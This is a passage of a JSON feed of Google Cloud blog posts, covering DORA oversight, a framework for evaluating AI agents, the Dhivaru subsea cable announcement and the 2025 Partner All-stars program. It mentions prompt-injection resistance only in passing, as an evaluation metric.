</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Along with our commitment to successful oversight, we remain focused on supporting our customers’ DORA compliance journeys with helpful resources like our </span><a href=\"https://services.google.com/fh/files/misc/eu_dora_customer_guide-register_of_information-googlecloud2.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Register of Information Guide</span></a><span style=\"vertical-align: baseline;\"> and our </span><a href=\"https://services.google.com/fh/files/misc/eu_dora_customer_guide_googlecloud.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ICT Risk Management Customer Guide</span></a><span style=\"vertical-align: baseline;\">. If you haven’t already, we also encourage our financial entity customers to consider our DORA-specific </span><a href=\"https://cloud.google.com/blog/products/identity-security/simplify-dora-compliance-with-google-clouds-updated-contracts?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">contract</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/blog/products/identity-security/the-eus-dora-has-arrived-google-cloud-is-ready-to-help?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">subcontractor</span></a><span style=\"vertical-align: baseline;\"> resources. Please contact your Google Cloud representative for further details.</span></p>\n<p><span style=\"vertical-align: baseline;\">As all financial entities subject to DORA will know, CTPP oversight does not replace your own responsibilities under DORA. That said, by supplementing risk management by financial entities and creating a clear mechanism for information and learnings to flow between CTPPs and key EU and national supervisory stakeholders, we feel confident that customers and users will benefit from the oversight of CTPPs. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We value the constructive dialogue the ESAs have fostered with industry, and look forward to continuing this collaboration with our Lead Overseer. We believe that together we can help to build a more resilient and secure financial sector in Europe. </span></p>\n<p><span style=\"vertical-align: baseline;\">As we move forward in this new era of direct oversight, our goal remains to make Google Cloud the best possible service for sustainable, digital transformation for all European organizations on their terms. </span></p></div>",
        "published_date": "2025-11-18 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/a-methodical-approach-to-agent-evaluation/",
        "title": "A methodical approach to agent evaluation: Building a robust quality gate",
        "thumbnail": null,
        "author": "Hugo Selbie",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">AI is shifting from single-response models to complex, multi-step agents that can reason, use tools, and complete sophisticated tasks. This increased capability means you need an evolution in how you evaluate these systems. Metrics focused only on the final output are no longer enough for systems that make a sequence of decisions.</span></p>\n<p><span style=\"vertical-align: baseline;\">A core challenge is that an agent can produce a correct output through an inefficient or incorrect process—what we call a \"silent failure\". For instance, an agent tasked with reporting inventory might give the correct number but reference last year's report by mistake. The result looks right, but the execution failed. When an agent fails, a simple \"wrong\" or \"right\" doesn't provide the diagnostic information you need to determine where the system broke down.</span></p>\n<p><span style=\"vertical-align: baseline;\">To debug effectively and ensure quality, you must understand multiple aspects of the agent's actions:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">trajectory</strong><span style=\"vertical-align: baseline;\">—the sequence of reasoning and tool calls that led to the result.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The overall </span><strong style=\"vertical-align: baseline;\">agentic interaction</strong><span style=\"vertical-align: baseline;\"> - the full conversation between the user and the agent (Assuming a chat agent)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Whether the agent was manipulated into its actions.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This article outlines a structured framework to help you build a robust, tailored agent evaluation strategy so you can trust that your agent can move from a proof-of-concept (POC) to production.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Start with success: Define your agent’s purpose</strong></h3>\n<p><span style=\"vertical-align: baseline;\">An effective evaluation strategy is built on a foundation of clear, unambiguous success criteria. You need to start by asking one critical question: What is the definition of success for this specific agent? These success statements must be specific enough to lead directly to measurable metrics.</span></p>\n<p> </p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Vague goal (not useful)</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Clear success statement (measurable)</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">\"The agent should be helpful.\"</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">RAG agent</strong><span style=\"vertical-align: baseline;\">: Success is providing a factually correct, concise summary that is fully grounded in known documents.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">\"The agent should successfully book a trip.\"</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Booking agent</strong><span style=\"vertical-align: baseline;\">: Success is correctly booking a multi-leg flight that meets all user constraints (time, cost, airline) with no errors.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><span style=\"vertical-align: baseline;\">By defining success first, you establish a clear benchmark for your agent to meet.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A purpose-driven evaluation framework</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A robust evaluation should have success criteria and associated testable metrics that cover three </span><strong style=\"vertical-align: baseline;\">pillars</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Pillar 1: Agent success and quality</strong></p>\n<p><span style=\"vertical-align: baseline;\">This assesses the complete agent interaction, focusing on the final output and user experience. Think of this like an integration test where the agent is tested exactly as it would be used in production.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">What it measures</strong><span style=\"vertical-align: baseline;\">: The end result.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Example metrics</strong><span style=\"vertical-align: baseline;\">: Interaction correctness, task completion rate, conversation groundedness, conversation coherence, and conversation relevance.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Pillar 2: Analysis of process and trajectory</strong></p>\n<p><span style=\"vertical-align: baseline;\">This focuses on the agent's internal decision-making process. This is critical for agents that perform complex, dynamic reasoning. Think of this like a series of unit tests for each decision path of your agent.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">What it measures</strong><span style=\"vertical-align: baseline;\">: The agent's reasoning process and tool usage.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Key metrics</strong><span style=\"vertical-align: baseline;\">: Tool selection accuracy, reasoning logic, and efficiency.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Pillar 3: Trust and safety assessment</strong></p>\n<p><span style=\"vertical-align: baseline;\">This evaluates the agent's reliability and resilience under non-ideal conditions. This is to prevent adversarial interactions with your agents. The reality is that when your agents are in production, they may be tested in unexpected ways, so it's important to build trust that your agent can handle these situations.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">What it measures</strong><span style=\"vertical-align: baseline;\">: Reliability under adverse conditions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Key metrics</strong><span style=\"vertical-align: baseline;\">: Robustness (error handling), security (resistance to prompt injection), and fairness (mitigation of bias).</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Define your tests: Methods for evaluation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With a framework in place, you can define specific tests that should be clearly determined by the metrics you chose. We recommend a multi-layered approach: </span></p>\n<p><strong style=\"vertical-align: baseline;\">Human evaluation</strong></p>\n<p><span style=\"vertical-align: baseline;\">Human evaluation is essential to ground your entire evaluation suite in real-world performance and domain expertise. This process establishes ground truth by identifying the specific failure modes the product is actually exhibiting and where it’s not able to meet your success criteria.</span></p>\n<p><strong style=\"vertical-align: baseline;\">LLM-as-a-judge</strong></p>\n<p><span style=\"vertical-align: baseline;\">Once human experts identify and document specific failure modes, you can build scalable, automated tests using an LLM to score agent performance. LLM-as-a-judge processes are used for complex, subjective failures and activities and can be used as rapid, repeatable tests to determine agent improvement. Before deployment, you should align the LLM judge to the human evaluation by comparing the judge's output against the original manual human output, groundtruthing the results.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Code-based evaluations</strong></p>\n<p><span style=\"vertical-align: baseline;\">These are the most inexpensive and deterministic tests, often identified in Pillar 2 by observing the agent trajectories. They are ideal for failure modes that can be checked with simple Python functions or logic, such as ensuring the output is JSON or meets specific length requirements.</span></p>\n<p> </p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Method</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Primary Goal</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Evaluation Target</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Scalability and Speed</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Human evaluation</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Establish \"ground truth\" for subjective quality and nuance.</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Pillar 1 (UX, style, safety) AND Pillar 2 (ethical/costly tool use).</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Low and slow; expensive and time-consuming.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">LLM-as-a-judge</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Approximate human judgment for subjective qualities at scale.</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Pillar 1 (coherence, helpfulness) AND Pillar 2 (quality of internal reasoning).</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Medium-High and fast; requires careful prompt engineering.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Programmatic evaluations</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Measure objective correctness against a known reference.</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Pillar 1 (factual accuracy, RAG grounding) AND Pillar 2 (tool call accuracy).</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">High and fast; ideal for automated regression testing.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Adversarial testing</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Test agent robustness and safety against unexpected/malicious inputs.</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The agent's failure mode (whether the agent fails safely or produces a harmful output).</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Medium; requires creative generation of test cases.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3><strong style=\"vertical-align: baseline;\">Generate high-quality evaluation data</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A robust framework is only as good as the data it runs on. Manually writing thousands of test cases creates a bottleneck. The most robust test suites blend multiple techniques to generate diverse, relevant, and realistic data at scale. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Synthesize conversations with \"dueling LLMs\"</strong><span style=\"vertical-align: baseline;\">: You can </span><strong style=\"vertical-align: baseline;\">use</strong><span style=\"vertical-align: baseline;\"> a second LLM to role-play as a user, generating diverse, multi-turn conversational data to test your agent at scale. This is great for creating a dataset to be used for Pillar 1 assessments.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Use and anonymize production data</strong><span style=\"vertical-align: baseline;\">: </span><strong style=\"vertical-align: baseline;\">Use</strong><span style=\"vertical-align: baseline;\"> anonymized, real-world user interactions to create a \"golden dataset\" that captures actual </span><strong style=\"vertical-align: baseline;\">use</strong><span style=\"vertical-align: baseline;\"> patterns and edge cases.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Human-in-the-loop curation</strong><span style=\"vertical-align: baseline;\">: Developers can save valuable interactive sessions from logs or traces as permanent test cases, continuously enriching the test suite with meaningful examples.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Do I need a golden dataset?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You always need evaluation data, such as logs or traces, to run any evaluation. However, you don't always need a pre-labeled golden dataset to start. While a golden dataset—which provides perfect, known-good outputs—is crucial for advanced validation (like understanding how an agent reaches a known answer in RAG or detecting regressions), it shouldn't be a blocker.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">How to start without one </strong></h3>\n<p><span style=\"vertical-align: baseline;\">It's possible to get started with just human evaluation and vibes-based evaluation metrics to determine initial quality. These initial, subjective metrics and feedback can then be adapted into LLM-as-a-Judge scoring for example:</span></p>\n<p><span style=\"vertical-align: baseline;\">Aggregate and convert early human feedback into a set of binary scores (Pass/Fail) for key dimensions like correctness, conciseness, or safety tested by LLM-as-a-Judge. The LLM-as-a-Judge then automatically scores the agent interaction against these binary metrics to determine overall success or failure. The agent's overall quality can then be aggregated and scored with a categorical letter grading system for example ‘A’ - All binary tests pass, ‘B’ - ⅔ of binary tests pass, ‘C’ - ⅓ of binary tests pass etc.</span></p>\n<p><span style=\"vertical-align: baseline;\">This approach lets you establish a structured quality gate immediately while you continuously build your golden dataset by curating real-world failures and successes.</span><span style=\"vertical-align: baseline;\"> </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Operationalize the process</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A one-time evaluation is just a snapshot. To drive continuous improvement, you must integrate the evaluation framework into the engineering lifecycle. Operationalizing evaluation changes it into an automated, continuous process.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Integrate evaluation into CI/CD</strong></p>\n<p><span style=\"vertical-align: baseline;\">Automation is the core of operationalization. Your evaluation suite should act as a </span><strong style=\"vertical-align: baseline;\">quality gate</strong><span style=\"vertical-align: baseline;\"> that runs automatically with every proposed change to the agent.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Process</strong><span style=\"vertical-align: baseline;\">: The pipeline executes the new agent version against your reference dataset, computes key metrics, and compares the scores against predefined thresholds.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Outcome</strong><span style=\"vertical-align: baseline;\">: If performance scores fall below the threshold, the build fails, which prevents quality regressions from reaching production.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Monitor performance in production</strong></p>\n<p><span style=\"vertical-align: baseline;\">The real world is the ultimate test. You should monitor for:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Operational metrics</strong><span style=\"vertical-align: baseline;\">: Tool call error rates, API latencies, and token consumption per interaction.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Quality and engagement metrics</strong><span style=\"vertical-align: baseline;\">: User feedback (e.g., thumbs up/down), conversation length, and task completion rates.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Drift detection</strong><span style=\"vertical-align: baseline;\">: Monitor for significant changes in the types of user queries or a gradual decrease in performance over time.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Create a virtuous feedback loop</strong></p>\n<p><span style=\"vertical-align: baseline;\">The final step is to feed production data back into your evaluation assets. This makes your evaluation suite a living entity that learns from real-world </span><strong style=\"vertical-align: baseline;\">use</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Review</strong><span style=\"vertical-align: baseline;\">: Periodically review production monitoring data and conversation logs.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Identify</strong><span style=\"vertical-align: baseline;\">: Isolate new or interesting interactions (especially failures or novel requests) that aren't in your current dataset.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Curate and add</strong><span style=\"vertical-align: baseline;\">: Anonymize these selected interactions, annotate them with the \"golden\" expected outcome, and add them to your reference dataset.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This continuous cycle ensures your agent becomes more effective and reliable with every update. You can track and visualize the results from these cycles by exporting the runs of these tests and leveraging dashboarding tools to see how the quality of your agent is evolving over time.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">To help you establish this robust quality gate, start using </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/models/evaluation-agents\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Generative AI Evaluation Service</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://google.github.io/adk-docs/evaluate/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK based trajectory evaluations</span></a>.</p></div>",
        "published_date": "2025-11-17 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/networking/introducing-dhivaru-new-subsea-cable/",
        "title": "Introducing Dhivaru and two new connectivity hubs",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Dhivaru_Map.max-600x600.jpg",
        "author": "Bikash Koley",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Today, we’re announcing Dhivaru, a new Trans-Indian Ocean subsea cable system that will connect the Maldives, Christmas Island and Oman. This investment will build on the <a href=\"https://cloud.google.com/blog/products/infrastructure/bosun-australia-connect-initiative-for-indo-pacific-connectivity?e=48754805\">Australia Connect</a> initiative, furthering the reach, reliability, and resilience of digital connectivity across the Indian Ocean.</p><p>Reach, reliability and resilience are integral to the success of AI-driven services for our users and customers. Tremendous adoption of groundbreaking services such as Gemini 2.5 Flash Image (aka Nano Banana) and Vertex AI, mean resilient connectivity has never been more important for our users. The speed of AI adoption is also outpacing anyone’s predictions, and Google is investing to meet this long-term demand.</p><p>“Dhivaru” is the line that controls the main sail on traditional Maldivian sailing vessels, and signifies the skill, strength, and experience of the early sailors navigating the seas.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Dhivaru_Map\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Dhivaru_Map.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>In addition to the cable investment, Google will be investing in creating two new connectivity hubs for the region. The Maldives and Christmas Island are naturally positioned for connectivity hubs to help improve digital connectivity for the region, including Africa, the Middle East, South Asia and Oceania.</p><p><i>“Google’s decision to invest in the Maldives is a strong signal of confidence in our country’s stable and open investment environment, and a direct contribution to my vision for a diversified, inclusive, and digitized Maldivian economy. As the world moves rapidly toward an era defined by digital transformation and artificial intelligence, this project reflects how the Maldives is positioning itself at the crossroads of global connectivity — leveraging our strategic geography to create new economic opportunities for our people and to participate meaningfully in the future of the global economy.”</i> - <b>His Excellency the President of Republic of Maldives</b></p><p><i>“We are delighted to partner with Google on this landmark initiative to establish a new connectivity hub in the Maldives. This project represents a major step forward in strengthening the nation’s digital infrastructure and enabling the next wave of digital transformation. As a leading digital provider, Ooredoo Maldives continues to expand world-class connectivity and digital services nationwide. This progress opens new opportunities for businesses such as tourism, enabling smarter operations, improved customer experiences and greater global reach. We are proud to be powering the next phase of the Digital Maldives.\"</i><b> - Ooredoo Maldives CEO and MD, Khalid Al Hamadi.</b></p><p><i>\"Dhiraagu is committed to advancing the digital connectivity of the Maldives and empowering our people, communities, and businesses. Over the years, we have made significant investments in building robust subsea cable systems — transforming the digital landscape — connecting the Maldives to the rest of the world and enabling the rollout of high-speed broadband across the nation. We are proud and excited to partner with Google on their expansion of subsea infrastructure and the establishment of a new connectivity hub in Addu City, the southernmost city of the Maldives. This strategic collaboration with one of the world’s largest tech players marks another milestone in strengthening the nation’s presence within the global subsea infrastructure, and further enhances the reliability and resiliency of our digital ecosystem.\"</i> -<b> Ismail Rasheed, CEO &amp; MD, DHIRAAGU</b></p></div>\n<div class=\"block-paragraph\"><h3>Connectivity hubs for the Indian Ocean region</h3><p>Connectivity hubs are strategic investments designed to future-proof regional connectivity and accelerate the delivery of next-generation services through three core capabilities: Cable switching, content caching, and colocation.</p><p><b>Cable switching: Delivering seamless resilience</b></p><p>Google carefully selects the locations for our connectivity hubs to minimize the distance data has to travel before it has a chance to ‘switch paths’.. This capability improves resilience, and ensures robust, high-availability connectivity across the region. The hubs also allow automatic re-routing of traffic between multiple cables. If one cable experiences a fault, traffic will automatically select the next best path and continue on its way. This ensures high availability not only for the host country, but minimizes downtime for services and users across the region.</p><p><b>Content caching: Accelerating digital services</b></p><p>Low latency is critical for optimal user experience. One of Google’s objectives is to serve content from as close to our users and customers as possible. By caching — storing copies of the most popular content locally — Google can reduce the latency to retrieve or view this content, improving the quality of services.</p><p><b>Colocation: Fostering a local ecosystem</b></p><p>Connectivity hubs are often in locations where users have limited access to high quality data centers to house their services and IT hardware, such as islands. Although these facilities are not very large as compared to a Google data center, Google understands the benefits of shared infrastructure, and is committed to providing rack space to carriers and local companies.</p><h3>Energy efficiency</h3><p>Subsea cables are very energy efficient. As a result, even when supporting multiple cables, content storage and colocation, a Google connectivity hub requires far less power than a typical data center. They are primarily focused on networking and localized storage and not the large demands supporting AI, cloud and other important building blocks of the Internet. Of course, the power required for a connectivity hub can still be a lot for some smaller locations, and where it is, Google is exploring using its power demand to accelerate local investment in sustainable energy generation, consistent with its long history of stimulating renewable energy solutions.</p><p>These new connectivity hubs in the Maldives and Christmas Island are ideally situated to deepen the resilience of internet infrastructure in the Indian Ocean Region. The facilities will help power our products, strengthen local economies and bring AI benefits to people and businesses around the world. We look forward to announcing future subsea cables and connectivity hubs and further enhancing the Internet’s reach, reliability, and resilience.</p></div>",
        "published_date": "2025-11-17 15:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/partners/2025-google-cloud-partner-all-stars/",
        "title": "Celebrating our 2025 Google Cloud Partner All-stars",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/2025_Partner_All-stars_blog_image.max-600x600.png",
        "author": "Kevin Ichhpurani",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At Google Cloud, we have the honor of partnering with some of the most brilliant and inventive individuals across the world. Each year, the Google Cloud Partner All-stars program honors these remarkable people for their dedication to innovation and commitment to excellence. Our 2025 All-stars are pushing our industry forward, and we’re thrilled to celebrate them.</span></p>\n<p><strong style=\"vertical-align: baseline;\">2025 Spotlight: AI Innovation</strong></p>\n<p><span style=\"vertical-align: baseline;\">For 2025, we’re </span><span style=\"vertical-align: baseline;\">excited to introduce a new category that recognizes strategic leaders in enterprise-wide AI adoption. These honorees are trusted advisors, helping customers transform their business using Google AI. This includes implementing agentic AI to transform core processes, create new revenue streams, or redefine operating models. </span></p>\n<p><span style=\"vertical-align: baseline;\">These All-stars showcase a holistic vision for how AI</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">integrates i</span><span style=\"vertical-align: baseline;\">nto a customer’s culture and strategy to drive lasting, measurable transformation that fundamentally alters business processes.</span></p>\n<p><strong style=\"vertical-align: baseline;\">What sets Partner All-stars apart? <br /></strong><span style=\"vertical-align: baseline;\">The following qualities define what it means to be a Partner All-star:</span></p>\n<p><strong style=\"vertical-align: baseline;\">AI Innovation</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Guides customers through profound business transformation by driving enterprise-wide AI adoption</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Establishes a strategic vision for integrating AI and autonomous agents into a customer's operating model</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Leverages agentic AI to redefine core processes, create new revenue streams, and transform business outcomes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Delivers lasting, measurable results that fundamentally alter a customer's business processes</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Delivery Excellence</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Top-ranked personnel on Google Cloud’s Delivery Readiness Portal (DRP)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Displays commitment to technical excellence by passing advanced delivery challenge labs and other advanced technical training</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Demonstrates excellent knowledge and adoption of Google Cloud delivery enablement methods, assets, and offerings</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Exhibits expertise through customer project and deployment experience  </span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Marketing</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Drives strategic programs and key events that address customer concerns and priorities</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Works with cross-functional teams to ensure the success of campaigns and events</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Takes a data-driven approach to marketing, investing resources and time in programs that drive the biggest impact</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Always explores areas of opportunity to improve future work</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Sales</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Embodies commitment to the customer transformation journey</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Consistently meets and exceeds sales targets</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Aligns on goals to deliver amazing end-to-end customer experiences </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Prioritizes long-term customer relationships over short-term 